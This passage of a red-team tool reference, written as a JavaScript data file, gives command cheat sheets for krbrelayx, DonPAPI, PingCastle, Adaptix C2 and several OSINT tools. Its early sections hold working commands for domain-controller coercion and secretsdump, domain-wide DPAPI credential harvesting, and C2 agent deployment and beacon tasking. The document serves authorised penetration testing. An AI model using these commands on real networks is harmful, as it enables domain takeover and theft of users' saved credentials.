              { label: "Unconstrained delegation to domain compromise", cmd: "# on the delegation-trusted host you control:\nkrbrelayx.py -aesKey <host_aes_key>\n# from another box, coerce the DC:\nprinterbug.py 'target.local/user:pass@dc01' attacker_host\n# a DC01$ TGT is written; reuse it:\nexport KRB5CCNAME=DC01\\$@TARGET.LOCAL.ccache\nsecretsdump.py -k -no-pass dc01.target.local" },
              { label: "Add your own delegation host via RBCD", cmd: "# if you cannot own an existing unconstrained host,\n# create a computer account and abuse constrained/RBCD paths instead\n# (see bloodyAD / ntlmrelayx --delegate-access)" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "This is the Kerberos-native counterpart to ntlmrelayx. Reach for krbrelayx when the identity in play is a Kerberos ticket rather than an NTLM auth.",
              "Unconstrained delegation on any host you can compromise is close to game over: coerce a DC to it and you capture the DC's TGT.",
              "You need the delegation host's key material (AES key or NT hash) for the listener to accept the incoming ticket — compromise the host first, or create your own computer object.",
              "Pairs with printerbug/PetitPotam/Coercer for the coercion step and with secretsdump for the DCSync payoff.",
              "See the Delegation and Coercion & NTLM Relay theory pages for the full mechanism."
            ]
          }
        ]
      },
      {
        id: "donpapi",
        name: "DonPAPI",
        url: "https://github.com/login-securite/DonPAPI",
        description: "Remotely harvests DPAPI-protected secrets across many hosts at once.",
        brief: "DonPAPI automates DPAPI looting at scale. Windows' Data Protection API encrypts browser passwords, saved RDP and Wi-Fi credentials, and scheduled-task secrets, protecting them with keys derived from the user's password or the domain backup key. Given domain admin (or the DPAPI domain backup key), DonPAPI sweeps a list of hosts, pulls the encrypted blobs and master keys, decrypts them remotely, and returns cleartext.\n\nIt turns 'I have domain admin' into 'I have every saved credential of every user who has logged into these machines', which is frequently a bigger prize than the domain admin hash itself.",
        quickReference: [
          { label: "Harvest across a subnet", cmd: "donpapi collect -t 10.10.10.0/24 -u admin -p pass -d target.local" },
          { label: "Use the DPAPI domain backup key", cmd: "donpapi collect -t targets.txt --pvk domain_backupkey.pvk -u admin -p pass -d target.local" },
          { label: "Pass-the-hash", cmd: "donpapi collect -t 10.10.10.10 -u admin -H :<nthash> -d target.local" },
          { label: "Review results", cmd: "donpapi gui   # browse the collected loot database" }
        ],
        sections: [
          {
            title: "What It Collects",
            type: "table",
            columns: ["Source", "Secrets recovered"],
            rows: [
              ["Browser credentials", "Saved passwords and cookies from Chrome, Edge, and others"],
              ["Windows Credential Manager", "Saved RDP, network, and application credentials"],
              ["DPAPI master keys", "The keys that unlock everything else, recoverable with the user password or backup key"],
              ["Wi-Fi profiles", "Stored wireless credentials"],
              ["Scheduled task creds", "Passwords stored for tasks that run as a user"],
              ["VNC / other", "Various application secrets covered by additional modules"]
            ]
          },
          {
            title: "Decryption Paths",
            type: "table",
            columns: ["Method", "When it applies"],
            rows: [
              ["User password / hash", "Decrypts that specific user's master keys and everything under them"],
              ["DPAPI domain backup key (.pvk)", "The master key the DC holds — decrypts every domain user's DPAPI secrets on any host"],
              ["Local machine keys", "System-context DPAPI secrets, given local SYSTEM access"],
              ["Why the backup key wins", "One .pvk from the DC decrypts DPAPI data domain-wide, no per-user password needed"]
            ]
          },
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-t <target>", "Host, list, or CIDR to sweep"],
              ["-u / -p / -d", "Credentials and domain"],
              ["-H <hash>", "Authenticate with an NT hash"],
              ["--pvk <file>", "Supply the DPAPI domain backup key for domain-wide decryption"],
              ["--no-remoteops / --no-vnc etc.", "Toggle individual collection modules"],
              ["gui", "Launch the local browser to review the loot database"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Extract the domain backup key first", cmd: "# with DA, pull the DPAPI backup key once:\ndpapi.py backupkeys -t target.local -u admin -p pass --export\n# then decrypt everything domain-wide with it" },
              { label: "Sweep and decrypt at scale", cmd: "donpapi collect -t targets.txt --pvk domain_backupkey.pvk \\\n  -u admin -p pass -d target.local\ndonpapi gui   # triage the recovered secrets" },
              { label: "Target the hosts that matter", cmd: "# admin workstations and jump hosts hold the best saved creds\ndonpapi collect -t admin_workstations.txt --pvk backup.pvk -u admin -p pass -d target.local" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The DPAPI domain backup key is the master prize: one .pvk from the DC decrypts every domain user's DPAPI secrets on every host, with no per-user password needed.",
              "The loot is often more valuable than the access that got it — saved browser and RDP credentials frequently reach systems and third parties outside the AD boundary entirely.",
              "It generates significant remote-access traffic across many hosts; it is a post-compromise, high-privilege, noisy tool — scope and time it accordingly.",
              "Credentials to external services (cloud, SaaS, partner systems) recovered this way can be a scope question — flag them rather than acting on them.",
              "See the DCSync and AD Fundamentals theory pages for how backup keys and domain secrets relate."
            ]
          }
        ]
      },
      {
        id: "pingcastle",
        name: "PingCastle",
        url: "https://www.pingcastle.com/",
        description: "Scores an AD domain's security posture and maps risks — the defender's-eye view.",
        brief: "PingCastle audits an Active Directory domain and produces a risk-scored report: a single maturity number, a breakdown across privileged accounts, trusts, stale objects, and known misconfigurations, and a prioritised list of what to fix. It reads the domain the way a defender would, which on a red team is exactly why it is useful — it surfaces the same weaknesses you would otherwise find by hand, quickly, and in a form the client already trusts.\n\nIt is authenticated but low-impact: a normal domain user can run the healthcheck, and it queries rather than exploits, which makes it safe to run early.",
        quickReference: [
          { label: "Full domain health check", cmd: "PingCastle.exe --healthcheck --server target.local" },
          { label: "Interactive menu", cmd: "PingCastle.exe" },
          { label: "Map trust relationships", cmd: "PingCastle.exe --healthcheck --explore-trust" },
          { label: "Scan for a specific risk", cmd: "PingCastle.exe --scanner <scanner_name> --server target.local" }
        ],
        sections: [
          {
            title: "Report Categories",
            type: "table",
            columns: ["Category", "What it scores"],
            rows: [
              ["Stale Objects", "Inactive accounts, old OS versions, unused but still-trusted objects"],
              ["Privileged Accounts", "Admin group hygiene, delegation, and privileged-account exposure"],
              ["Trusts", "Trust relationships and the risk each inbound/outbound trust introduces"],
              ["Anomalies", "Known misconfigurations and attack primitives (roasting exposure, weak ACLs, etc.)"],
              ["Maturity score", "A single 0–100 style figure summarising overall posture for management"]
            ]
          },
          {
            title: "Built-in Scanners",
            type: "table",
            columns: ["Scanner", "Checks for"],
            rows: [
              ["aclcheck", "Dangerous ACLs on key objects"],
              ["antivirus", "Endpoint protection presence across hosts"],
              ["laps_bitlocker", "Whether LAPS and BitLocker are deployed"],
              ["localadmin", "Local administrator group membership"],
              ["nullsession", "Hosts still allowing anonymous enumeration"],
              ["smb / smb3querynetwork", "SMB signing and version posture"],
              ["spooler", "Print Spooler running (PrinterBug exposure)"]
            ]
          },
          {
            title: "Reading It as an Attacker",
            type: "table",
            columns: ["Finding", "Offensive relevance"],
            rows: [
              ["Kerberoastable admins", "High-value roast targets, pre-identified"],
              ["Unconstrained delegation", "Coercion-to-DC-compromise candidates"],
              ["Spooler enabled on DCs", "PrinterBug coercion is available"],
              ["Weak/old trusts", "Cross-domain and cross-forest movement paths"],
              ["Accounts with old passwords", "Likely weak or reused credentials worth spraying"],
              ["Missing SMB signing", "Relay targets, matching netexec's relay list"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Baseline the domain early", cmd: "PingCastle.exe --healthcheck --server target.local\n# open the HTML report; the Anomalies section is your prioritised attack list" },
              { label: "Cross-reference with BloodHound", cmd: "# PingCastle names the misconfigurations; BloodHound shows the paths\n# a Kerberoastable admin in PingCastle -> trace its reach in BloodHound" },
              { label: "Produce the client-facing risk view", cmd: "# the maturity score and remediation list drop straight into a report\n# framing findings the way the client's own auditors would" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "It is authenticated but query-only and low-impact — safe to run early with any domain user, unlike the exploitation tooling around it.",
              "The Anomalies section is effectively a pre-built attack plan: it lists the same misconfigurations you would hunt for manually, ranked.",
              "Because clients recognise and trust PingCastle output, its report is a persuasive way to communicate findings and remediation in a deliverable.",
              "It complements BloodHound rather than replacing it: PingCastle scores what is wrong, BloodHound shows how the wrong things connect into a path.",
              "See the AD Fundamentals, Trusts, and Delegation theory pages for the concepts behind the scores."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Command & Control",
    tools: [
      {
        id: "adaptix-c2",
        name: "Adaptix C2",
        url: "https://github.com/Adaptix-Framework/AdaptixC2",
        description: "Open-source, extensible command-and-control framework for red team operations.",
        brief: "Adaptix C2 is an open-source, extensible command-and-control framework built around a team server, configurable listeners, and generated agents (\"beacons\") that operators task from a shared console — a free alternative to commercial C2 platforms like Cobalt Strike.",
        quickReference: [
          { label: "Start the team server", cmd: "adaptixserver -profile profile.json" },
          { label: "Connect as an operator", cmd: "adaptixclient --connect <server>:<port>" },
          { label: "Add a listener", cmd: "Listeners > Add > choose HTTP/HTTPS/TCP" },
          { label: "Generate an agent", cmd: "Build > Agent > select listener + output format" },
          { label: "Task a beacon", cmd: "beacon> shell whoami" }
        ],
        sections: [
          {
            title: "Architecture",
            type: "table",
            columns: ["Component", "Description"],
            rows: [
              ["Team Server", "The central process agents call back to and operators connect to — holds all engagement state"],
              ["Listener", "Defines how an agent communicates with the team server — HTTP(S), TCP, or SMB, each with its own config"],
              ["Agent / Beacon", "The payload running on a compromised host, checking in on an interval defined at build/runtime"],
              ["Operator", "A user connected to the team server with permission to view and task agents"],
              ["Profile", "A config file (traffic shaping, ports, certs) the team server starts with"]
            ]
          },
          {
            title: "Listeners",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["HTTP(S) listener", "Most common — blends with normal web traffic, supports custom headers/URIs for traffic shaping"],
              ["TCP listener", "Used for peer-to-peer agent chaining/pivoting rather than direct external callbacks"],
              ["Redirector", "A reverse proxy sitting in front of the listener so the team server's real address is never exposed directly"],
              ["Traffic shaping", "Customizing headers, URIs, and response profiles so beacon traffic doesn't look default/templated"]
            ]
          },
          {
            title: "Payloads",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Output formats", "Agents can typically be generated as EXE, DLL, service binary, or raw shellcode depending on the delivery method"],
              ["Staged vs. stageless", "Staged payloads pull the full agent after initial execution; stageless embed everything up front — tradeoff between initial payload size and callback footprint"],
              ["Listener binding", "Each generated agent is tied to a specific listener at build time"],
              ["Sleep / jitter", "Callback interval and randomization, configurable at build time and adjustable later from the beacon console"]
            ]
          },
          {
            title: "Operators",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Multi-operator support", "Several operators can connect to the same team server at once, sharing visibility into agents and logs"],
              ["Shared session log", "Tasking and output from any operator is visible to the rest of the team — useful for deconfliction on an engagement"]
            ]
          },
          {
            title: "Beacons & Tasking",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["shell <cmd>", "Run a shell command on the compromised host"],
              ["cd <path>", "Change the beacon's working directory"],
              ["ls / dir", "List files in the current directory"],
              ["download <path>", "Pull a file back to the team server"],
              ["upload <local> <remote>", "Push a file to the compromised host"],
              ["sleep <seconds> <jitter%>", "Adjust the beacon's check-in interval and jitter"],
              ["exit", "Terminate the beacon"]
            ]
          },
          {
            title: "OPSEC Notes",
            type: "table",
            columns: ["Consideration", "Description"],
            rows: [
              ["Sleep & jitter", "Set both to something that resembles normal background traffic for the environment, not the defaults"],
              ["Redirectors", "Never expose the team server directly — front every listener with a redirector"],
              ["Payload variation", "Reuse of identical payload signatures across engagements is an easy detection/attribution vector"],
              ["Cleanup", "Tear down listeners and remove agents at the end of an engagement — don't leave infrastructure live"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Stand up a listener and generate a payload", cmd: "# 1. Start the team server\nadaptixserver -profile profile.json\n# 2. Connect as an operator\nadaptixclient --connect <server>:<port>\n# 3. Listeners > Add > HTTP(S), configure host/URI\n# 4. Build > Agent > select the listener, choose output format\n# 5. Deliver the generated agent to the target" },
              { label: "Task an active beacon", cmd: "# In the operator console:\n# 1. Select the checked-in beacon\n# 2. beacon> shell whoami\n# 3. beacon> ls\n# 4. beacon> download <interesting_file>" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Use only against systems you own or are explicitly authorized to test as part of a scoped engagement.",
              "Treat every generated agent like any other payload — build and test it in a controlled environment first.",
              "Document and tear down all listener/redirector infrastructure at the end of an engagement.",
              "Default sleep/jitter values are a starting point, not an OPSEC strategy — tune them to the environment."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "OSINT",
    tools: [
      {
        id: "hunter-io",
        name: "Hunter.io",
        url: "https://hunter.io/",
        description: "Discovers a company's email naming convention and verifies specific addresses.",
        brief: "Hunter.io is a web-based OSINT tool for figuring out how an organization structures its email addresses and checking whether a specific address is real — useful groundwork before any phishing-risk assessment or further people-focused recon.",
        quickReference: [
          { label: "Learn a domain's email pattern", cmd: "hunter.io/domain-search — enter a domain" },
          { label: "Guess a specific person's address", cmd: "hunter.io/email-finder — enter a name + domain" },
          { label: "Check if an address is real", cmd: "hunter.io/email-verifier — enter the address" },
          { label: "Same lookups via API", cmd: "api.hunter.io/v2/domain-search?domain=example.com&api_key=<key>" }
        ],
        sections: [
          {
            title: "Domain Search",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["What it returns", "The dominant email pattern for a domain (e.g. {first}.{last}@), a list of discovered addresses, and their sources"],
              ["Confidence per result", "Each discovered address includes a confidence score based on where it was found"],
              ["Typical use", "Run this first, before anything else — it tells you the naming convention everything else relies on"]
            ]
          },
          {
            title: "Email Finder",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Input required", "A person's name plus the target domain"],
              ["Output", "A best-guess address built from the domain's known pattern, plus a confidence score"],
              ["Limitation", "It's a pattern-based guess, not a confirmed mailbox — verify before relying on it"]
            ]
          },
          {
            title: "Email Verifier",
            type: "table",
            columns: ["Status", "Meaning"],
            rows: [
              ["valid", "The address is confirmed deliverable"],
              ["invalid", "The address does not exist"],
              ["accept-all", "The domain's mail server accepts everything — a specific address can't be confirmed this way"],
              ["unknown", "Verification was inconclusive"]
            ]
          },
          {
            title: "Confidence Scores",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["What the score means", "How reliable the sources are that this specific address is correct — not a guarantee"],
              ["Low-confidence hits", "Cross-verify through a second method (e.g. company site, LinkedIn) before using in a report"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Typical OSINT workflow", cmd: "1. Domain Search on the target domain — learn the naming pattern\n2. Email Finder for each named person of interest\n3. Email Verifier on every candidate address\n4. Cross-check names against LinkedIn / the company site" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The free tier has a monthly search limit — budget lookups instead of burning them on exploratory queries.",
              "Treat every result as a lead, not a confirmed contact — verify through a second method before it goes in a report.",
              "An accept-all domain makes verification unreliable by nature — flag this explicitly rather than reporting a confidence score at face value."
            ]
          }
        ]
      },
      {
        id: "theharvester",
        name: "theHarvester",
        url: "https://github.com/laramies/theHarvester",
        description: "Gathers emails, subdomains, hosts, and names for a domain from public sources.",
        brief: "theHarvester is the classic first-move OSINT collector: give it a domain and it queries dozens of public sources — search engines, certificate transparency logs, DNS datasets, and paid API providers — to return emails, subdomains, hosts, IPs, and employee names.\n\nIt's a breadth tool, not a depth tool. The point is to build the initial picture of an organisation's footprint in one command, then hand the interesting pieces to a focused tool (Amass for subdomains, Hunter.io for email patterns, Shodan for exposed services).",
        quickReference: [
          { label: "All free sources against a domain", cmd: "theHarvester -d example.com -b all" },
          { label: "Single source, capped results", cmd: "theHarvester -d example.com -b crtsh -l 500" },
          { label: "List every available source", cmd: "theHarvester -d example.com -b \"\"" },
          { label: "Save HTML + JSON report", cmd: "theHarvester -d example.com -b all -f report" },
          { label: "Resolve and port-scan what it finds", cmd: "theHarvester -d example.com -b all -n -c" }
        ],
        sections: [
          {
            title: "Core Options",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-d <domain>", "Target domain or company name — the only required argument"],
              ["-b <source>", "Data source to query; 'all' runs every configured source"],
              ["-l <n>", "Limit the number of results pulled per source (default 500)"],
              ["-S <n>", "Start at result number n — useful for paging past what you already collected"],
              ["-f <name>", "Write results to <name>.html, <name>.json and <name>.xml"],
              ["-p", "Enable Shodan lookups on discovered hosts (needs an API key)"]
            ]
          },
          {
            title: "Free Sources",
            type: "table",
            columns: ["Source", "What it provides"],
            rows: [
              ["crtsh", "Certificate transparency logs — the single most reliable free subdomain source"],
              ["duckduckgo", "Search-engine results; no API key, rarely rate-limited"],
              ["baidu / yahoo", "Alternate search engines — occasionally surface pages Google has dropped"],
              ["anubis", "Aggregated subdomain dataset from JonLuca's Anubis-DB"],
              ["hackertarget", "Free DNS/host lookups, generous but rate-limited"],
              ["otx", "AlienVault Open Threat Exchange passive DNS"],
              ["rapiddns", "Passive DNS index, good subdomain coverage"],
              ["threatminer", "Passive DNS and WHOIS aggregation"],
              ["urlscan", "Historical page scans — often exposes internal-looking hostnames"],
              ["dnsdumpster", "DNS records and host mapping"],
              ["sublist3r", "Wraps several public subdomain aggregators"],
              ["certspotter", "Second certificate transparency feed, distinct coverage from crtsh"]
            ]
          },
          {
            title: "API-Key Sources",
            type: "table",
            columns: ["Source", "Notes"],
            rows: [
              ["shodan", "Exposed services and banners for discovered IPs — the highest-value paid source"],
              ["securitytrails", "Deep historical DNS and subdomain data; free tier is small"],
              ["hunter", "Email addresses and the domain's naming pattern"],
              ["censys", "Certificate and host data; free tier allows a modest query budget"],
              ["virustotal", "Passive DNS resolutions and related domains"],
              ["github-code", "Searches public GitHub code for the domain — finds leaked hostnames and endpoints"],
              ["intelx", "Intelligence X archive; includes leaked and pastebin material"],
              ["fullhunt / bevigil / zoomeye", "Attack-surface datasets, each with a free API tier"],
              ["Key file location", "~/.theHarvester/api-keys.yaml — copy the template from the repo and fill in what you have"]
            ]
          },
          {
            title: "Post-Processing",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-n", "DNS-resolve every discovered host to an IP"],
              ["-c", "DNS brute-force additional subdomains against the domain"],
              ["-t", "Attempt DNS zone-transfer / takeover checks on discovered hosts"],
              ["-r", "Reverse-DNS the IP range around discovered hosts"],
              ["-s", "Shodan-query every resolved IP (requires -p style key config)"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Baseline sweep of an unfamiliar organisation", cmd: "theHarvester -d example.com -b all -l 1000 -f baseline\n# review baseline.html, then feed the subdomain list onward:\njq -r '.hosts[]' baseline.json | cut -d: -f1 | sort -u > hosts.txt" },
              { label: "Free-only run (no API keys configured)", cmd: "theHarvester -d example.com -b crtsh,duckduckgo,anubis,rapiddns,otx,certspotter -l 1000 -f free" },
              { label: "Enrich results with resolution and scanning", cmd: "theHarvester -d example.com -b all -n -c -f enriched\n# then port-scan the live hosts with nmap:\nnmap -sV -iL hosts.txt -oA harvest_scan" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Run it inside a virtualenv or via the Docker image — the dependency list churns and a system-wide install breaks easily.",
              "'-b all' will fail loudly on every source you have no key for; those errors are noise, not a broken install.",
              "Email results are frequently stale or scraped from unrelated pages. Verify each one before it reaches a report.",
              "Search-engine sources get rate-limited fast. If results suddenly drop to zero, wait rather than retrying in a loop.",
              "Treat the output as leads to confirm, not as an inventory — theHarvester is deliberately broad and noisy."
            ]
          }
        ]
      },
      {
        id: "amass",
        name: "OWASP Amass",
        url: "https://github.com/owasp-amass/amass",
        description: "In-depth attack surface mapping and subdomain enumeration with graph storage.",
        brief: "Amass is the heavyweight of subdomain enumeration. It combines passive collection from dozens of data sources with active resolution, brute forcing, permutation, and certificate scraping, then stores everything in a local graph database so results accumulate across runs.\n\nThe graph is the part that separates it from simpler tools: because findings persist, you can track how an organisation's attack surface changes over weeks, and query relationships (ASN, netblock, org name) rather than just reading a flat list of hostnames.",
        quickReference: [
          { label: "Passive enumeration — quiet, no traffic to target", cmd: "amass enum -passive -d example.com" },
          { label: "Active enumeration with resolution", cmd: "amass enum -active -d example.com -brute" },
          { label: "Query results already in the graph", cmd: "amass db -names -d example.com" },
          { label: "Map an organisation's netblocks and ASNs", cmd: "amass intel -org \"Example Corp\"" },
          { label: "Write findings to a file", cmd: "amass enum -passive -d example.com -o subs.txt" }
        ],
        sections: [
          {
            title: "Subcommands",
            type: "table",
            columns: ["Subcommand", "Purpose"],
            rows: [
              ["amass enum", "The main event — discover subdomains for one or more domains"],
              ["amass intel", "Work outward from an organisation name, IP range, or ASN to find root domains"],
              ["amass db", "Query and export what previous runs already stored in the graph"],
              ["amass viz", "Render the graph to a visual format (D3, GEXF, Graphistry, Maltego)"],
              ["amass track", "Diff results between enumerations to see what changed over time"]
            ]
          },
          {
            title: "Enumeration Modes",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-passive", "Data sources only — sends nothing to the target's infrastructure"],
              ["-active", "Adds DNS resolution, certificate grabbing, and zone transfer attempts"],
              ["-brute", "DNS brute-force with the built-in or a supplied wordlist"],
              ["-alts", "Generate permutations/alterations of discovered names (dev-, -staging, numeric increments)"],
              ["-nocolor / -silent", "Strip formatting for clean piping into other tools"]
            ]
          },
          {
            title: "Scope Control",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-d <domain>", "Target domain; repeat the flag or comma-separate for several"],
              ["-df <file>", "Read the domain list from a file"],
              ["-i <ip/CIDR>", "Include specific IPs or netblocks in scope"],
              ["-asn <number>", "Include everything in an ASN"],
              ["-exclude <sources>", "Skip named data sources (e.g. slow or key-less ones)"],
              ["-include <sources>", "Use only the named data sources"],
              ["-blf <file>", "Blacklist file of domains to leave out of results"]
            ]
          },
          {
            title: "Brute Forcing",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-brute", "Enable DNS brute forcing"],
              ["-w <wordlist>", "Use a custom wordlist instead of the embedded one"],
              ["-min-for-recursive <n>", "Only recurse into a subdomain after n labels are found beneath it"],
              ["-max-dns-queries <n>", "Cap concurrent DNS queries — lower it on slow or rate-limited resolvers"],
              ["-rf <file>", "Supply your own trusted resolver list; the default public resolvers throttle hard"]
            ]
          },
          {
            title: "Data Sources & Config",
            type: "table",
            columns: ["Item", "Description"],
            rows: [
              ["Config location", "~/.config/amass/config.ini (or config.yaml on v4) — holds API keys and resolver settings"],
              ["-list", "Print every data source Amass knows about and whether it is configured"],
              ["Worthwhile keys", "SecurityTrails, Censys, Shodan, VirusTotal, GitHub, PassiveTotal — each meaningfully widens coverage"],
              ["Graph location", "The output directory (default ~/.config/amass/) holds the persistent asset database"]
            ]
          },
          {
            title: "Output & Tracking",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["-o <file>", "Write discovered names to a text file"],
              ["-json <file>", "Write full structured results including sources and addresses"],
              ["-dir <path>", "Use a specific graph directory — keep one per engagement to avoid mixing scopes"],
              ["amass db -show -d example.com", "Print everything stored for a domain, with source attribution"],
              ["amass track -d example.com", "Show what appeared or disappeared since the previous run"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Quiet reconnaissance (no target contact)", cmd: "amass enum -passive -d example.com -dir ./engagement -o passive.txt\nwc -l passive.txt" },
              { label: "Full-depth enumeration", cmd: "amass enum -active -brute -alts -d example.com \\\n  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \\\n  -rf resolvers.txt -dir ./engagement -json full.json" },
              { label: "Organisation-to-domains pivot", cmd: "amass intel -org \"Example Corp\" -whois\n# take the ASNs it reports, then:\namass intel -asn 64500 -dir ./engagement" },
              { label: "Monthly change tracking", cmd: "amass enum -passive -d example.com -dir ./engagement\namass track -d example.com -dir ./engagement -last 2" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Passive mode is the safe default. Active mode touches target infrastructure and belongs only inside an authorised scope.",
              "Amass is slow by design — a thorough active run on a large org can take hours. Run it early and let it work while you do something else.",
              "Use a separate -dir per engagement. Mixing clients into one graph is a scoping mistake waiting to happen.",
              "Supply your own resolver list for brute forcing; public resolvers rate-limit and silently drop answers, producing false negatives.",
              "Cross-check its output against subfinder — the two disagree often enough that the union is meaningfully larger than either alone."
            ]
          }
        ]
      },
      {
        id: "subfinder",
        name: "Subfinder",
        url: "https://github.com/projectdiscovery/subfinder",
        description: "Fast passive subdomain discovery built for piping into other tools.",
        brief: "Subfinder is ProjectDiscovery's passive subdomain enumerator: it queries a large set of online sources and returns valid subdomains, fast, with no traffic to the target. It does one thing and is designed to be the first stage of a pipeline — its output flows straight into httpx, dnsx, or nuclei.\n\nWhere Amass is thorough and slow, subfinder is quick and clean. Most workflows run both and merge the results.",
        quickReference: [
          { label: "Enumerate a domain", cmd: "subfinder -d example.com" },
          { label: "Silent output for piping", cmd: "subfinder -d example.com -silent" },
          { label: "Use every source, including slow ones", cmd: "subfinder -d example.com -all -recursive" },
          { label: "Pipe straight into live-host probing", cmd: "subfinder -d example.com -silent | httpx -silent -title -sc" },
          { label: "Bulk mode from a domain list", cmd: "subfinder -dL domains.txt -o all_subs.txt" }
        ],
        sections: [
          {
            title: "Input",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-d <domain>", "Target domain; comma-separate for several"],
              ["-dL <file>", "Read target domains from a file, one per line"],
              ["-exclude-sources <list>", "Skip named sources"],
              ["-s <list>", "Use only the named sources"],
              ["-all", "Query every source, including the slow ones skipped by default"],
              ["-recursive", "Use only sources that can enumerate subdomains of subdomains"]
            ]
          },
          {
            title: "Output",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-o <file>", "Write results to a file"],
              ["-oJ", "JSON Lines output, including which source found each name"],
              ["-oD <dir>", "Write one file per domain when running in bulk"],
              ["-cs", "Include the source name alongside each result"],
              ["-silent", "Print only subdomains — no banner, no status lines"],
              ["-nc", "Disable colour codes"]
            ]
          },
          {
            title: "Configuration",
            type: "table",
            columns: ["Item", "Description"],
            rows: [
              ["Provider config", "$HOME/.config/subfinder/provider-config.yaml — API keys go here, one list per provider"],
              ["Multiple keys per provider", "You can list several keys for one provider; subfinder rotates through them"],
              ["-ls", "List all available sources and which ones need keys"],
              ["High-value keys", "SecurityTrails, Censys, Shodan, VirusTotal, Chaos, GitHub — these roughly double typical coverage"]
            ]
          },
          {
            title: "Rate & Performance",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-t <n>", "Concurrent resolution threads (default 10)"],
              ["-rl <n>", "Global rate limit in requests per second across all sources"],
              ["-timeout <s>", "Seconds to wait before giving up on a source (default 30)"],
              ["-max-time <m>", "Hard cap in minutes on the whole enumeration"],
              ["-proxy <url>", "Route requests through an HTTP proxy"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard discovery pipeline", cmd: "subfinder -d example.com -all -silent \\\n  | httpx -silent -status-code -title -tech-detect \\\n  | tee live_hosts.txt" },
              { label: "Merge with Amass for full coverage", cmd: "subfinder -d example.com -all -silent > sub_sf.txt\namass enum -passive -d example.com -o sub_am.txt\nsort -u sub_sf.txt sub_am.txt > subdomains.txt" },
              { label: "Bulk across a scope file", cmd: "subfinder -dL in_scope.txt -all -oD ./results -silent\ncat ./results/*.txt | sort -u > all_subdomains.txt" },
              { label: "Feed a vulnerability scan", cmd: "subfinder -d example.com -silent | httpx -silent | nuclei -t exposures/ -severity medium,high,critical" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Subfinder is passive only — it never sends a request to the target. That makes it safe to run before authorisation paperwork is finalised, unlike active enumeration.",
              "Without API keys you are getting maybe half the available coverage. Filling in the free-tier keys is the single highest-value setup step.",
              "It returns names, not live hosts. Always follow with httpx or dnsx before assuming anything you found actually resolves.",
              "-all is noticeably slower but consistently finds more. Use it for real engagements and skip it for quick checks."
            ]
          }
        ]
      },
      {
        id: "shodan",
        name: "Shodan",
        url: "https://www.shodan.io/",
        description: "Search engine for internet-connected devices, banners, and exposed services.",
        brief: "Shodan continuously scans the public internet and indexes what answers: service banners, TLS certificates, HTTP headers, screenshots, ICS protocols, and more. Instead of scanning a target yourself, you query what Shodan already saw — which is both faster and completely passive from the target's perspective.\n\nIt is most useful for finding an organisation's forgotten infrastructure: the staging box nobody decommissioned, the database with no authentication, the admin panel on a non-standard port.",
        quickReference: [
          { label: "Everything Shodan knows about an IP", cmd: "shodan host 1.2.3.4" },
          { label: "Search from the CLI", cmd: "shodan search --fields ip_str,port,org 'org:\"Example Corp\"'" },
          { label: "Count results without spending credits", cmd: "shodan count \"apache country:US\"" },
          { label: "Find hosts by certificate name", cmd: "ssl.cert.subject.CN:\"example.com\"" },
          { label: "Everything in an org's netblock", cmd: "net:1.2.3.0/24" }
        ],
        sections: [
          {
            title: "Core Search Filters",
            type: "table",
            columns: ["Filter", "Description"],
            rows: [
              ["hostname:example.com", "Match hosts whose reverse DNS or banner hostname contains the string"],
              ["net:1.2.3.0/24", "Restrict to an IP range or CIDR block"],
              ["org:\"Example Corp\"", "Match the organisation registered to the IP block"],
              ["asn:AS64500", "Match everything in an autonomous system"],
              ["port:8080", "Match a specific open port"],
              ["product:nginx", "Match an identified software product"],
              ["version:\"1.18\"", "Match a specific software version — pair with product:"],
              ["os:\"Windows Server 2019\"", "Match fingerprinted operating system"],
              ["country:IN / city:\"Pune\"", "Geographic filters"]
            ]
          },
          {
            title: "Web & Certificate Filters",
            type: "table",
            columns: ["Filter", "Description"],
            rows: [
              ["http.title:\"Login\"", "Match the HTML title of the served page"],
              ["http.html:\"internal use only\"", "Match a string in the page body"],
              ["http.status:200", "Match the HTTP response code"],
              ["http.favicon.hash:<n>", "Match a favicon hash — an excellent way to fingerprint an app across unrelated IPs"],
              ["ssl.cert.subject.CN:example.com", "Match the certificate's common name — finds hosts DNS never points at"],
